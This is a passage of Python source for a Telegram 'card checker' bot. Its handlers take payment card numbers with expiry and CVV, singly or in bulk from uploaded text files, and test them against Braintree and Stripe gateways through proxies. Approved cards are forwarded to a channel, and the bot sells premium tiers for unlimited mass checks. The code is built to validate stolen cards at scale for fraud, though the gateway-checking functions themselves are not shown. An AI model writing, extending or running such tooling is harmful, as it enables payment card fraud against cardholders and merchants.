🎯 Gateway: Shopify
⚡ Processing complete!

👤 Checked by: {get_user_info(msg.from_user.id)['username']}
🔌 Proxy: {check_proxy_status()}

✗ Thank you for using our service"""
            send_long_message(chat_id, final_message)

    threading.Thread(target=process_all).start()

# ---------------- Braintree Commands ---------------- #

@bot.message_handler(commands=['br'])
def br_handler(msg):
    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
  
🔰 AUTHORIZATION REQUIRED 🔰         

• You are not authorized to use this command
• Only authorized users can check cards

• Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id)

    # Check for spam (30 second cooldown for free users)
    if check_cooldown(msg.from_user.id, "br"):
        return send_long_message(msg.chat.id, """

❌ ⏰ COOLDOWN ACTIVE ⏰


• You are in cooldown period
• Please wait 30 seconds before checking again

✗ Upgrade to premium to remove cooldowns""", reply_to_message_id=msg.message_id)

    cc = None

    # Check if user replied to a message
    if msg.reply_to_message:
        # Extract CC from replied message
        replied_text = msg.reply_to_message.text or ""
        cc = normalize_card(replied_text)

        if not cc:
            return send_long_message(msg.chat.id, """

❌ INVALID CARD FORMAT ❌


• The replied message doesn't contain a valid card
• Please use the correct format:

Valid format:
`/br 4556737586899855|12|2026|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)
    else:
        # Check if CC is provided as argument
        args = msg.text.split(None, 1)
        if len(args) < 2:
            return send_long_message(msg.chat.id, """

  ⚡ INVALID USAGE ⚡


• Please provide a card to check
• Usage: `/br <card_details>`

Valid format:
`/br 4556737586899855|12|2026|123`

• Or reply to a message containing card details with /br

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)

        # Try to normalize the provided CC
        raw_input = args[1]

        # Check if it's already in valid format
        if re.match(r'^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$', raw_input):
            cc = raw_input
        else:
            # Try to normalize the card
            cc = normalize_card(raw_input)

            # If normalization failed, use the original input
            if not cc:
                cc = raw_input

    # Set cooldown for free users (30 seconds)
    if not is_admin(msg.from_user.id) and not is_premium(msg.from_user.id):
        set_cooldown(msg.from_user.id, "br", 10)

    processing = send_long_message(msg.chat.id, """

⚙️ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 - ⌬ 𝘽𝙍𝘼𝙄𝙉𝙏𝙍𝙀𝙀 𝘼𝙐𝙏𝙃 - 𝟣 


🔮 Initializing Braintree Gateway...
🔄 Connecting to Braintree API
📡 Establishing secure connection

⏳ Status: [▒▒▒▒▒▒▒▒▒▒] 0%
⚡ Please wait while we process your card""", reply_to_message_id=msg.message_id)
    
    if isinstance(processing, list) and len(processing) > 0:
        processing = processing[0]

    def update_braintree_loading(message_id, progress, status):
        """Update Braintree loading animation"""
        bars = int(progress / 10)
        bar = "█" * bars + "▒" * (10 - bars)
        loading_text = f"""

⚙️ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 - ⌬ 𝘽𝙍𝘼𝙄𝙉𝙏𝙍𝙀𝙀 𝘼𝙐𝙏𝙃 - 𝟣

🔮 {status}
🔄 Processing your request
📡 Contacting payment gateway

⏳ Status: [{bar}] {progress}%
⚡ Almost there..."""
        
        try:
            edit_long_message(msg.chat.id, message_id, loading_text)
        except:
            pass

    def check_and_reply():
        try:
            # Stage 1: Initializing
            update_braintree_loading(processing.message_id, 20, "Initializing Gateway...")
            time.sleep(0.5)
            
            # Stage 2: Connecting to API
            update_braintree_loading(processing.message_id, 40, "Connecting to Braintree API...")
            time.sleep(0.5)
            
            # Stage 3: Validating card
            update_braintree_loading(processing.message_id, 60, "Validating card details...")
            time.sleep(0.5)
            
            # Stage 4: Processing payment
            update_braintree_loading(processing.message_id, 80, "Processing payment request...")
            time.sleep(0.5)
            
            # Stage 5: Finalizing
            update_braintree_loading(processing.message_id, 95, "Finalizing transaction...")
            time.sleep(0.3)
            
            result = check_card(cc)
            
            # Update stats
            if "APPROVED CC ✅" in result:
                update_stats(approved=1)
                update_user_stats(msg.from_user.id, approved=True)
            else:
                update_stats(declined=1)
                update_user_stats(msg.from_user.id, approved=False)
                
            # Add user info and proxy status to the result
            user_info_data = get_user_info(msg.from_user.id)
            user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
            proxy_status = check_proxy_status()
            
            # Format the result with the new information
            formatted_result = result.replace(
                "⚡ Powered by : @mhitzxg & @pr0xy_xd",
                f"👤 Checked by: {user_info}\n"
                f"🔌 Proxy: {proxy_status}\n"
                f"⚡ Powered by: @mhitzxg & @pr0xy_xd"
            )
            
            edit_long_message(msg.chat.id, processing.message_id, formatted_result, parse_mode='HTML')
            
            # If card is approved, send to channel
            if "APPROVED CC ✅" in result:
                notify_channel(formatted_result)
                
        except Exception as e:
            edit_long_message(msg.chat.id, processing.message_id, f"❌ Error: {str(e)}")

    threading.Thread(target=check_and_reply).start()

@bot.message_handler(commands=['mbr'])
def mbr_handler(msg):
    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """

🔰 AUTHORIZATION REQUIRED 🔰
 

• You are not authorized to use this command
• Only authorized users can check cards

✗ Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id)

    # Check for cooldown (10 minutes for free users)
    if check_cooldown(msg.from_user.id, "mbr"):
        return send_long_message(msg.chat.id, """

 ⏰ COOLDOWN ACTIVE ⏰


• You are in cooldown period
• Please wait 10 minutes before mass checking again

✗ Upgrade to premium to remove cooldowns""", reply_to_message_id=msg.message_id)

    if not msg.reply_to_message:
        return send_long_message(msg.chat.id, """

  ⚡ INVALID USAGE ⚡


• Please reply to a .txt file with /mbr
• The file should contain card details

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)

    reply = msg.reply_to_message

    # Detect whether it's file or raw text
    if reply.document:
        file_info = bot.get_file(reply.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        text = downloaded_file.decode('utf-8', errors='ignore')
    else:
        text = reply.text or ""
        if not text.strip():
            return send_long_message(msg.chat.id, "❌ Empty text message.", reply_to_message_id=msg.message_id)

    # Extract CCs using improved normalization
    cc_lines = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue

        # Try to normalize each line
        normalized_cc = normalize_card(line)
        if normalized_cc:
            cc_lines.append(normalized_cc)
        else:
            # Fallback to original regex patterns
            found = re.findall(r'\b(?:\d[ -]*?){13,16}\b.*?\|.*?\|.*?\|.*', line)
            if found:
                cc_lines.extend(found)
            else:
                parts = re.findall(r'\d{12,16}[|: -]\d{1,2}[|: -]\d{2,4}[|: -]\d{3,4}', line)
                cc_lines.extend(parts)

    if not cc_lines:
        return send_long_message(msg.chat.id, """

 ❌ NO VALALID CARDS ❌


• No valid card formats found the file
• Please check the file format

Valid format:
`4556737586899855|12|2026|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)

    # Check card limit for free users (10 cards)
    user_id = msg.from_user.id
    if not is_admin(user_id) and not is_premium(user_id) and len(cc_lines) > 10:
        return send_long_message(msg.chat.id, f"""

 ❌ LIMIT EXCEEDED ❌


• Free users can only check 10 cards at once
• You tried to check {len(cc_lines)} cards


💰 UPGRADE TO PREMIUM 💰


• Upgrade to premium for unlimited checks
• Use /subscription to view plans
• Contact @mhitzxg to purchase""", reply_to_message_id=msg.message_id)

    # Check if it's a raw paste (not a file) and limit for free users
    if not reply.document and not is_admin(user_id) and not is_premium(user_id) and len(cc_lines) > 15:
        return send_long_message(msg.chat.id, """

 ❌ TOO MANY CARDS ❌


• You can only check 15 cards in a message
• Please use a .txt file for larger checks""", reply_to_message_id=msg.message_id)

    # Set cooldown for free users (10 minutes)
    if not is_admin(user_id) and not is_premium(user_id):
        set_cooldown(user_id, "mbr", 600)  # 10 minutes = 600 seconds

    total = len(cc_lines)
    user_id = msg.from_user.id

    # Determine where to send messages (group or private)
    chat_id = msg.chat.id if msg.chat.type in ["group", "supergroup"] else user_id

    # Combined loading message with counter and status bar
    loading_msg = send_long_message(chat_id, f"""

⚙️ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 - 🔄 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗠𝗔𝗦𝗦 𝗔𝗨𝗧𝗛 🔄 ⚙️


📊 Total Cards: {total}
🎯 Gateway: Braintree Auth
🔮 Status: Preparing batch...

📊 Progress: [0/{total}] 
🕒 Time Elapsed: 0.00s

▰▱▱▱▱▱▱▱▱▱ 0%

♻️ ⏳ PROCESSING CARDS ⏳ ♻️

• Mass check in progress...
• Please wait, this may take some time

⚡ Status will update automatically""")
    
    if isinstance(loading_msg, list) and len(loading_msg) > 0:
        loading_msg = loading_msg[0]

    def update_combined_loading(message_id, progress, current, status, elapsed):
        """Update combined loading animation with counter and status bar"""
        bars = int(progress / 10)
        bar = "▰" * bars + "▱" * (10 - bars)
        loading_text = f"""

⚙️ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 - 🔄 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗠𝗔𝗦𝗦 𝗔𝗨𝗧𝗛 🔄 ⚙️


📊 Total Cards: {total}
🎯 Gateway: Braintree Auth
🔮 Status: {status}

📊 Progress: [{current}/{total}] 
🕒 Time Elapsed: {elapsed:.2f}s

{bar} {progress}%

♻️ ⏳ PROCESSING CARDS ⏳ ♻️

• Mass check in progress...
• Please wait, this may take some time

⚡ {random.choice(['Validating cards...', 'Processing payments...', 'Checking limits...', 'Contacting gateway...'])}"""
        
        try:
            edit_long_message(chat_id, message_id, loading_text)
        except:
            pass

    approved, declined, checked = 0, 0, 0
    approved_cards = []  # To store all approved cards
    approved_message_id = None  # To track the single approved cards message
    start_time = time.time()

    def process_all():
        nonlocal approved, declined, checked, approved_cards, approved_message_id
        
        for i, cc in enumerate(cc_lines, 1):
            try:
                # Update combined loading animation
                progress = int((i / len(cc_lines)) * 100)
                elapsed = time.time() - start_time
                update_combined_loading(loading_msg.message_id, progress, i, f"Checking card {i}", elapsed)
                
                checked += 1
                result = check_card(cc.strip())
                if "APPROVED CC ✅" in result:
                    approved += 1
                    # Add user info and proxy status to approved cards
                    user_info_data = get_user_info(msg.from_user.id)
                    user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
                    proxy_status = check_proxy_status()
                    
                    # Format the result with the new information
                    formatted_result = result.replace(
                        "⚡ Powered by : @mhitzxg & @pr0xy_xd",
                        f"👤 Checked by: {user_info}\n"
                        f"🔌 Proxy: {proxy_status}\n"
                        f"⚡ Powered by: @mhitzxg & @pr0xy_xd"
                    )
                    
                    approved_cards.append(formatted_result)  # Store approved card with original format
                    
                    # Send approved card to channel
                    notify_channel(formatted_result)
                    
                    # Create or update the single approved cards message
                    if approved_message_id is None:
                        # First approved card - create the message
                        approved_header = f"""
╔═══════════════════════╗
       ✅ APPROVED CARDS FOUND ✅
╚═══════════════════════╝

"""
                        approved_message = approved_header + formatted_result + f"""

• Approved: {approved} | Declined: {declined} | Checked: {checked}/{total}
"""
                        sent_msg = send_long_message(chat_id, approved_message, parse_mode='HTML')
                        if sent_msg and hasattr(sent_msg, 'message_id'):
                            approved_message_id = sent_msg.message_id
                        elif sent_msg and isinstance(sent_msg, list) and len(sent_msg) > 0:
                            approved_message_id = sent_msg[0].message_id
                    else:
                        # Update existing message with new approved card
                        approved_header = f"""
╔═══════════════════════╗
       ✅ APPROVED CARDS FOUND ✅
╚═══════════════════════╝

"""
                        all_approved_cards = "\n\n".join(approved_cards)
                        approved_message = approved_header + all_approved_cards + f"""

• Approved: {approved} | Declined: {declined} | Checked: {checked}/{total}
"""
                        try:
                            edit_long_message(chat_id, approved_message_id, approved_message, parse_mode='HTML')
                        except:
                            # If message editing fails, send a new one
                            sent_msg = send_long_message(chat_id, approved_message, parse_mode='HTML')
                            if sent_msg and hasattr(sent_msg, 'message_id'):
                                approved_message_id = sent_msg.message_id
                            elif sent_msg and isinstance(sent_msg, list) and len(sent_msg) > 0:
                                approved_message_id = sent_msg[0].message_id
                else:
                    declined += 1

                time.sleep(1)  # Reduced sleep time for faster processing
            except Exception as e:
                send_long_message(user_id, f"❌ Error: {e}")

        # Update stats after processing all cards
        update_stats(approved=approved, declined=declined)
        for i in range(approved):
            update_user_stats(msg.from_user.id, approved=True)
        for i in range(declined):
            update_user_stats(msg.from_user.id, approved=False)

        # Delete the loading message
        try:
            bot.delete_message(chat_id, loading_msg.message_id)
        except:
            pass

        # Send final results in the approved message
        total_time = time.time() - start_time
        
        if approved_message_id is not None:
            # Update the approved cards message with final results
            approved_header = f"""
╔═══════════════════════╗
✅ APPROVED CARDS FOUND ✅
╚═══════════════════════╝

"""
            all_approved_cards = "\n\n".join(approved_cards)
            final_approved_message = approved_header + all_approved_cards + f"""

╔═══════════════════════╗
✅ MASS CHECK COMPLETED ✅
╚═══════════════════════╝

📊 Final Results:
• ✅ Approved: {approved}
• ❌ Declined: {declined}
• 📋 Total: {total}
• ⏰ Time: {total_time:.2f}s

🎯 Gateway: Braintree
⚡ Processing complete!

👤 Checked by: {get_user_info(msg.from_user.id)['username']}
🔌 Proxy: {check_proxy_status()}
"""
            try:
                edit_long_message(chat_id, approved_message_id, final_approved_message, parse_mode='HTML')
            except:
                # If editing fails, send as new message
                send_long_message(chat_id, final_approved_message, parse_mode='HTML')
        else:
            # No approved cards, send completion message
            final_message = f"""
╔═══════════════════════╗
✅ MASS CHECK COMPLETED ✅
╚═══════════════════════╝

📊 Final Results:
• ✅ Approved: {approved}
• ❌ Declined: {declined}
• 📋 Total: {total}
• ⏰ Time: {total_time:.2f}s

🎯 Gateway: Braintree
⚡ Processing complete!

👤 Checked by: {get_user_info(msg.from_user.id)['username']}
🔌 Proxy: {check_proxy_status()}

✗ Thank you for using our service"""
            send_long_message(chat_id, final_message)

    threading.Thread(target=process_all).start()


# ---------------- Stripe Auth Commands ---------------- #

@bot.message_handler(commands=['ch'])
def ch_handler(msg):
    """Check single card using Stripe gateway"""
    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
  
🔰 AUTHORIZATION REQUIRED 🔰         

• You are not authorized to use this command
• Only authorized users can check cards

• Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id)

    # Check for spam (30 second cooldown for free users)
    if check_cooldown(msg.from_user.id, "ch"):
        return send_long_message(msg.chat.id, """

❌ ⏰ COOLDOWN ACTIVE ⏰


• You are in cooldown period
• Please wait 30 seconds before checking again

✗ Upgrade to premium to remove cooldowns""", reply_to_message_id=msg.message_id)

    cc = None

    # Check if user replied to a message
    if msg.reply_to_message:
        # Extract CC from replied message
        replied_text = msg.reply_to_message.text or ""
        cc = normalize_card(replied_text)

        if not cc:
            return send_long_message(msg.chat.id, """

❌ INVALID CARD FORMAT ❌


• The replied message doesn't contain a valid card
• Please use the correct format:

Valid format:
`/ch 4556737586899855|12|2026|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)
    else:
        # Check if CC is provided as argument
        args = msg.text.split(None, 1)
        if len(args) < 2:
            return send_long_message(msg.chat.id, """

  ⚡ INVALID USAGE ⚡


• Please provide a card to check
• Usage: `/ch <card_details>`

Valid format:
`/ch 4556737586899855|12|2026|123`

• Or reply to a message containing card details with /ch

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)

        # Try to normalize the provided CC
        raw_input = args[1]

        # Check if it's already in valid format
        if re.match(r'^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$', raw_input):
            cc = raw_input
        else:
            # Try to normalize the card
            cc = normalize_card(raw_input)

            # If normalization failed, use the original input
            if not cc:
                cc = raw_input

    # Set cooldown for free users (30 seconds)
    if not is_admin(msg.from_user.id) and not is_premium(msg.from_user.id):
        set_cooldown(msg.from_user.id, "ch", 10)

    processing = send_long_message(msg.chat.id, """

⚙️ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 - ⌬ 𝙎𝙏𝙍𝙄𝙋𝙀 𝘼𝙐𝙏𝙃 - 𝟣


🔮 Initializing Gateway...
🔄 Connecting to Stripe API
📡 Establishing secure connection

⏳ Status: [▒▒▒▒▒▒▒▒▒▒] 0%
⚡ Please wait while we process your card""", reply_to_message_id=msg.message_id)
    
    if isinstance(processing, list) and len(processing) > 0:
        processing = processing[0]

    def update_loading(message_id, progress, status):
        """Update loading animation"""
        bars = int(progress / 10)
        bar = "█" * bars + "▒" * (10 - bars)
        loading_text = f"""

⚙️ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 - ⌬ 𝙎𝙏𝙍𝙄𝙋𝙀 𝘼𝙐𝙏𝙃 - 𝟣

🔮 {status}
🔄 Processing your request
📡 Contacting payment gateway

⏳ Status: [{bar}] {progress}%
⚡ Almost there..."""
        
        try:
            edit_long_message(msg.chat.id, message_id, loading_text)
        except:
            pass

    def check_and_reply():
        try:
            # Stage 1: Initializing
            update_loading(processing.message_id, 20, "Initializing Gateway...")
            time.sleep(0.5)
            
            # Stage 2: Connecting to API
            update_loading(processing.message_id, 40, "Connecting to Stripe API...")
            time.sleep(0.5)
            
            # Stage 3: Validating card
            update_loading(processing.message_id, 60, "Validating card details...")
            time.sleep(0.5)
            
            # Stage 4: Processing payment
            update_loading(processing.message_id, 80, "Processing payment request...")
            time.sleep(0.5)
            
            # Stage 5: Finalizing
            update_loading(processing.message_id, 95, "Finalizing transaction...")
            time.sleep(0.3)
            
            result = check_card_stripe(cc)
            
            # Update stats
            if "APPROVED CC ✅" in result or "APPROVED CCN ✅" in result:
                update_stats(approved=1)
                update_user_stats(msg.from_user.id, approved=True)
            else:
                update_stats(declined=1)
                update_user_stats(msg.from_user.id, approved=False)
                
            # Add user info and proxy status to the result
            user_info_data = get_user_info(msg.from_user.id)
            user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
            proxy_status = check_proxy_status()
            
            # Format the result with the new information
            formatted_result = result.replace(
                "🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』",
                f"👤 Checked by: {user_info}\n"
                f"🔌 Proxy: {proxy_status}\n"
                f"🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』"
            )
            
            edit_long_message(msg.chat.id, processing.message_id, formatted_result, parse_mode='HTML')
            
            # If card is approved, send to channel
            if "APPROVED CC ✅" in result or "APPROVED CCN ✅" in result:
                notify_channel(formatted_result)
                
        except Exception as e:
            edit_long_message(msg.chat.id, processing.message_id, f"❌ Error: {str(e)}")

    threading.Thread(target=check_and_reply).start()

@bot.message_handler(commands=['mch'])
def mch_handler(msg):
    """Mass check cards using Stripe gateway"""
    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """

🔰 AUTHORIZATION REQUIRED 🔰
 

• You are not authorized to use this command
• Only authorized users can check cards

✗ Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id)

    # Check for cooldown (10 minutes for free users)
    if check_cooldown(msg.from_user.id, "mch"):
        return send_long_message(msg.chat.id, """

 ⏰ COOLDOWN ACTIVE ⏰


• You are in cooldown period
• Please wait 10 minutes before mass checking again

✗ Upgrade to premium to remove cooldowns""", reply_to_message_id=msg.message_id)

    if not msg.reply_to_message:
        return send_long_message(msg.chat.id, """

  ⚡ INVALID USAGE ⚡


• Please reply to a .txt file with /mch
• The file should contain card details

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)

    reply = msg.reply_to_message

    # Detect whether it's file or raw text
    if reply.document:
        file_info = bot.get_file(reply.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        text = downloaded_file.decode('utf-8', errors='ignore')
    else:
        text = reply.text or ""
        if not text.strip():
            return send_long_message(msg.chat.id, "❌ Empty text message.", reply_to_message_id=msg.message_id)

    # Extract CCs using improved normalization
    cc_lines = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue

        # Try to normalize each line
        normalized_cc = normalize_card(line)
        if normalized_cc:
            cc_lines.append(normalized_cc)
        else:
            # Fallback to original regex patterns
            found = re.findall(r'\b(?:\d[ -]*?){13,16}\b.*?\|.*?\|.*?\|.*', line)
            if found:
                cc_lines.extend(found)
            else:
                parts = re.findall(r'\d{12,16}[|: -]\d{1,2}[|: -]\d{2,4}[|: -]\d{3,4}', line)
                cc_lines.extend(parts)

    if not cc_lines:
        return send_long_message(msg.chat.id, """

 ❌ NO VALALID CARDS ❌


• No valid card formats found the file
• Please check the file format

Valid format:
`4556737586899855|12|2026|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)

    # Check card limit for free users (10 cards)
    user_id = msg.from_user.id
    if not is_admin(user_id) and not is_premium(user_id) and len(cc_lines) > 10:
        return send_long_message(msg.chat.id, f"""

 ❌ LIMIT EXCEEDED ❌


• Free users can only check 10 cards at once
• You tried to check {len(cc_lines)} cards


💰 UPGRADE TO PREMIUM 💰


• Upgrade to premium for unlimited checks
• Use /subscription to view plans
• Contact @mhitzxg to purchase""", reply_to_message_id=msg.message_id)

    # Check if it's a raw paste (not a file) and limit for free users
    if not reply.document and not is_admin(user_id) and not is_premium(user_id) and len(cc_lines) > 15:
        return send_long_message(msg.chat.id, """

 ❌ TOO MANY CARDS ❌


• You can only check 15 cards in a message
• Please use a .txt file for larger checks""", reply_to_message_id=msg.message_id)

    # Set cooldown for free users (10 minutes)
    if not is_admin(user_id) and not is_premium(user_id):
        set_cooldown(user_id, "mch", 600)  # 10 minutes = 600 seconds

    total = len(cc_lines)
    user_id = msg.from_user.id

    # Determine where to send messages (group or private)
    chat_id = msg.chat.id if msg.chat.type in ["group", "supergroup"] else user_id

    # Combined loading message with counter and status bar
    loading_msg = send_long_message(chat_id, f"""

⚙️ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 - ⌬ 𝙎𝙏𝙍𝙄𝙋𝙀 𝙈𝘼𝙎𝙎 𝘼𝙐𝙏𝙃 ⌬


📊 Total Cards: {total}
🎯 Gateway: Stripe Auth - 1
🔮 Status: Preparing batch...

📊 Progress: [0/{total}] 
🕒 Time Elapsed: 0.00s

▰▱▱▱▱▱▱▱▱▱ 0%

♻️ ⏳ PROCESSING CARDS ⏳ ♻️

• Mass check in progress...
• Please wait, this may take some time

⚡ Status will update automatically""")
    
    if isinstance(loading_msg, list) and len(loading_msg) > 0:
        loading_msg = loading_msg[0]

    def update_combined_loading(message_id, progress, current, status, elapsed):
        """Update combined loading animation with counter and status bar"""
        bars = int(progress / 10)
        bar = "▰" * bars + "▱" * (10 - bars)
        loading_text = f"""

⚙️ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 - ⌬ 𝙎𝙏𝙍𝙄𝙋𝙀 𝙈𝘼𝙎𝙎 𝘼𝙐𝙏𝙃 ⌬


📊 Total Cards: {total}
🎯 Gateway: Stripe Auth - 1
🔮 Status: {status}

📊 Progress: [{current}/{total}] 
🕒 Time Elapsed: {elapsed:.2f}s

{bar} {progress}%

♻️ ⏳ PROCESSING CARDS ⏳ ♻️

• Mass check in progress...
• Please wait, this may take some time

⚡ {random.choice(['Validating cards...', 'Processing payments...', 'Checking limits...', 'Contacting gateway...'])}"""
        
        try:
            edit_long_message(chat_id, message_id, loading_text)
        except:
            pass

    approved, declined, checked = 0, 0, 0
    approved_cards = []  # To store all approved cards
    approved_message_id = None  # To track the single approved cards message
    start_time = time.time()

    def process_all():
        nonlocal approved, declined, checked, approved_cards, approved_message_id
        
        for i, cc in enumerate(cc_lines, 1):
            try:
                # Update combined loading animation
                progress = int((i / len(cc_lines)) * 100)
                elapsed = time.time() - start_time
                update_combined_loading(loading_msg.message_id, progress, i, f"Checking card {i}", elapsed)
                
                checked += 1
                result = check_card_stripe(cc.strip())
                if "APPROVED CC ✅" in result or "APPROVED CCN ✅" in result:
                    approved += 1
                    # Add user info and proxy status to approved cards
                    user_info_data = get_user_info(msg.from_user.id)
                    user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
                    proxy_status = check_proxy_status()
                    
                    # Format the result with the new information
                    formatted_result = result.replace(
                        "🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』",
                        f"👤 Checked by: {user_info}\n"
                        f"🔌 Proxy: {proxy_status}\n"
                        f"🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』"
                    )
                    
                    approved_cards.append(formatted_result)  # Store approved card with original format
                    
                    # Send approved card to channel
                    notify_channel(formatted_result)
                    
                    # Create or update the single approved cards message
                    if approved_message_id is None:
                        # First approved card - create the message
                        approved_header = f"""
╔═══════════════════════╗
✅ APPROVED CARDS FOUND ✅
╚═══════════════════════╝

"""
                        approved_message = approved_header + formatted_result + f"""

• Approved: {approved} | Declined: {declined} | Checked: {checked}/{total}
"""
                        sent_msg = send_long_message(chat_id, approved_message, parse_mode='HTML')
                        if sent_msg and hasattr(sent_msg, 'message_id'):
                            approved_message_id = sent_msg.message_id
                        elif sent_msg and isinstance(sent_msg, list) and len(sent_msg) > 0:
                            approved_message_id = sent_msg[0].message_id
                    else:
                        # Update existing message with new approved card
                        approved_header = f"""
╔═══════════════════════╗
✅ APPROVED CARDS FOUND ✅
╚═══════════════════════╝

"""
                        all_approved_cards = "\n\n".join(approved_cards)
                        approved_message = approved_header + all_approved_cards + f"""

• Approved: {approved} | Declined: {declined} | Checked: {checked}/{total}
"""
                        try:
                            edit_long_message(chat_id, approved_message_id, approved_message, parse_mode='HTML')
                        except:
                            # If message editing fails, send a new one
                            sent_msg = send_long_message(chat_id, approved_message, parse_mode='HTML')
                            if sent_msg and hasattr(sent_msg, 'message_id'):
                                approved_message_id = sent_msg.message_id
                            elif sent_msg and isinstance(sent_msg, list) and len(sent_msg) > 0:
                                approved_message_id = sent_msg[0].message_id
                else:
                    declined += 1

                time.sleep(1)  # Reduced sleep time for faster processing
            except Exception as e:
                send_long_message(user_id, f"❌ Error: {e}")

        # Update stats after processing all cards
        update_stats(approved=approved, declined=declined)
        for i in range(approved):
            update_user_stats(msg.from_user.id, approved=True)
        for i in range(declined):
            update_user_stats(msg.from_user.id, approved=False)

        # Delete the loading message
        try:
            bot.delete_message(chat_id, loading_msg.message_id)
        except:
            pass

        # Send final results in the approved message
        total_time = time.time() - start_time
        
        if approved_message_id is not None:
            # Update the approved cards message with final results
            approved_header = f"""
╔═══════════════════════╗
✅ APPROVED CARDS FOUND ✅
╚═══════════════════════╝

"""
            all_approved_cards = "\n\n".join(approved_cards)
            final_approved_message = approved_header + all_approved_cards + f"""

╔═══════════════════════╗
✅ MASS CHECK COMPLETED ✅
╚═══════════════════════╝

📊 Final Results:
• ✅ Approved: {approved}
• ❌ Declined: {declined}
• 📋 Total: {total}
• ⏰ Time: {total_time:.2f}s

🎯 Gateway: Stripe Auth
⚡ Processing complete!

👤 Checked by: {get_user_info(msg.from_user.id)['username']}
🔌 Proxy: {check_proxy_status()}
"""
            try:
                edit_long_message(chat_id, approved_message_id, final_approved_message, parse_mode='HTML')
            except:
                # If editing fails, send as new message
                send_long_message(chat_id, final_approved_message, parse_mode='HTML')
        else:
            # No approved cards, send completion message
            final_message = f"""
╔═══════════════════════╗
✅ MASS CHECK COMPLETED ✅
╚═══════════════════════╝

📊 Final Results:
• ✅ Approved: {approved}
• ❌ Declined: {declined}
• 📋 Total: {total}
• ⏰ Time: {total_time:.2f}s

🎯 Gateway: Stripe Auth
⚡ Processing complete!

👤 Checked by: {get_user_info(msg.from_user.id)['username']}
🔌 Proxy: {check_proxy_status()}

✗ Thank you for using our service"""
            send_long_message(chat_id, final_message)

    threading.Thread(target=process_all).start()

# ---------------- Stripe Charge Commands ---------------- #
@bot.message_handler(commands=['st'])
def st_handler(msg):
    """Check single card using Stripe gateway"""
    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
  
🔰 AUTHORIZATION REQUIRED 🔰         

• You are not authorized to use this command
• Only authorized users can check cards

• Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id)

    # Check for spam (30 second cooldown for free users)
    if check_cooldown(msg.from_user.id, "ch"):
        return send_long_message(msg.chat.id, """

❌ ⏰ COOLDOWN ACTIVE ⏰


• You are in cooldown period
• Please wait 30 seconds before checking again

✗ Upgrade to premium to remove cooldowns""", reply_to_message_id=msg.message_id)

    cc = None

    # Check if user replied to a message
    if msg.reply_to_message:
        # Extract CC from replied message
        replied_text = msg.reply_to_message.text or ""
        cc = normalize_card(replied_text)

        if not cc:
            return send_long_message(msg.chat.id, """

❌ INVALID CARD FORMAT ❌


• The replied message doesn't contain a valid card
• Please use the correct format:

Valid format:
`/ch 4556737586899855|12|2026|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)
    else:
        # Check if CC is provided as argument
        args = msg.text.split(None, 1)
        if len(args) < 2:
            return send_long_message(msg.chat.id, """

  ⚡ INVALID USAGE ⚡


• Please provide a card to check
• Usage: `/ch <card_details>`

Valid format:
`/ch 4556737586899855|12|2026|123`

• Or reply to a message containing card details with /ch

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)

        # Try to normalize the provided CC
        raw_input = args[1]

        # Check if it's already in valid format
        if re.match(r'^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$', raw_input):
            cc = raw_input
        else:
            # Try to normalize the card
            cc = normalize_card(raw_input)

            # If normalization failed, use the original input
            if not cc:
                cc = raw_input

    # Set cooldown for free users (30 seconds)
    if not is_admin(msg.from_user.id) and not is_premium(msg.from_user.id):
        set_cooldown(msg.from_user.id, "ch", 10)

    processing = send_long_message(msg.chat.id, """

⚙️ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 - ⌬ 𝙎𝙏𝙍𝙄𝙋𝙀 𝘾𝙃𝘼𝙍𝙂𝙀 1$


🔮 Initializing Gateway...
